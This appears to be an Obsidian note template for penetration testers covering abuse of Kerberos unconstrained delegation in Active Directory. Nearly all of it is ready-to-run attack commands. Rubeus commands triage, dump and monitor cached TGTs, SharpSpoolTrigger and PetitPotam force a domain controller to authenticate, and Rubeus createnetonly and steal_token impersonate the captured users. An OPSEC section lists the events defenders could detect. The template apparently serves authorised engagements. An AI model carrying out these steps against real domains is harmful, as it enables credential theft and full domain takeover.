---
# Attack-specific fields
delegation_host:
delegation_host_fqdn:
trigger_target:
trigger_target_fqdn:
captured_luid:
captured_ticket:
monitor_interval: 10
notes:
---

# Unconstrained Delegation

> [!abstract] Attack Summary
> Machines configured for unconstrained delegation cache TGTs of any user that authenticates to them via Kerberos. If you control such a machine (or compromise one), you can extract those cached TGTs and impersonate any user who authenticated — including Domain Admins and Domain Controllers.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["DC FQDN",  b?.dc_fqdn  ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
dv.table(["Field", "Value"], [
  ["Host with Unconstrained Delegation (short)",  `\`INPUT[text:delegation_host]\``],
  ["Host with Unconstrained Delegation (FQDN)",   `\`INPUT[text:delegation_host_fqdn]\``],
  ["Force-Auth Target (e.g. DC hostname)",        `\`INPUT[text:trigger_target]\``],
  ["Force-Auth Target FQDN",                      `\`INPUT[text:trigger_target_fqdn]\``],
  ["Monitor Interval (seconds)",                  `\`INPUT[text(defaultValue("${p.monitor_interval ?? 10}")):monitor_interval]\``],
]);
```

---

## Step 1 — Enumerate Unconstrained Delegation Hosts

**Windows — ADSearch**
```dataviewjs
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe " +
  "--search \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" " +
  "--attributes samaccountname,dnshostname\n\n# Note: Domain Controllers are always unconstrained — ignore them unless targeting DC TGTs\n```");
```

**Windows — PowerView**
```dataviewjs
dv.paragraph("```powershell\nGet-DomainComputer -Unconstrained -Properties samaccountname,dnshostname\n```");
```

**Linux — Impacket**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain   ?? "DOMAIN";
const dc_ip    = b?.dc_ip    ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\nimpacket-findDelegation " + domain + "/" + username + ":'" + password + "' -dc-ip " + dc_ip + "\n```");
```

Delegation host found: `INPUT[text:delegation_host]` / `INPUT[text:delegation_host_fqdn]`

---

## Step 2 — Check Cached Tickets (After Compromising Delegation Host)

> [!warning] Prerequisite: You must have SYSTEM on the machine with unconstrained delegation.

**Windows — Rubeus Triage**
```dataviewjs
dv.paragraph("```bash\n# Must be running as SYSTEM\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe triage\n\n# Look for entries where Service = krbtgt/DOMAIN (these are TGTs)\n# Note the LUID value for extraction\n```");
```

Enter LUID: `INPUT[text:captured_luid]`

---

## Step 3 — Extract TGT

**Windows — Rubeus Dump**
```dataviewjs
const p = dv.current();
const luid = p?.captured_luid || "0xLUID";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe dump /luid:" + luid + " /service:krbtgt /nowrap\n```");
```

Paste extracted TGT (base64): `INPUT[text:captured_ticket]`

---

## Step 4 — Monitor for New TGTs (Active Capture)

> [!tip] Use Rubeus monitor mode + force authentication from a target machine for live capture.

**Start Monitor**
```dataviewjs
const p = dv.current();
const interval = p?.monitor_interval ?? 10;
dv.paragraph("```bash\n# Start in one Beacon session — leave running\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /interval:" + interval + " /nowrap\n```");
```

**Force Authentication — SpoolSample / SharpSpoolTrigger**
```dataviewjs
const p   = dv.current();
const b   = dv.page("Templates/New Templates/00 - Engagement Baseline");
const trigger = p?.trigger_target_fqdn || "dc.domain.local";
const listener= p?.delegation_host_fqdn || "DELEGATION_HOST_FQDN";
dv.paragraph("```bash\n# Trigger DC authentication to delegation host (forces TGT caching)\nexecute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe " +
  trigger + " " + listener + "\n\n# Alternative: PetitPotam\npetitpotam.py -u '' " + listener + " " + trigger + "\n```");
```

> After triggering, Rubeus monitor will capture the machine TGT. For machine account TGTs, see **S4U2Self Abuse** template.

---

## Step 5 — Use the TGT

**Windows — Import into new logon session**
```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain  = b?.domain ?? "DOMAIN";
const ticket  = p?.captured_ticket || "BASE64_TICKET";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe createnetonly " +
  "/program:C:\\Windows\\System32\\cmd.exe /domain:" + domain.split('.')[0].toUpperCase() +
  " /username:TARGET_USER /password:FakePass /ticket:" + ticket + "\n\n# Then steal token from the new PID\nsteal_token PID\n```");
```

---

## OPSEC

> [!warning] Detection Indicators
> - TGT caching on non-DC machines is anomalous and can be baselined.
> - SpoolSample/PetitPotam trigger MS-RPRN/MS-EFSRPC calls — visible in Wireshark and some SIEMs.
> - Rubeus monitor polls LSASS continuously — may generate excessive 4769 events.
> - Use `jobkill` to stop monitor when done.

---

## Notes & Results

`INPUT[textarea:notes]`
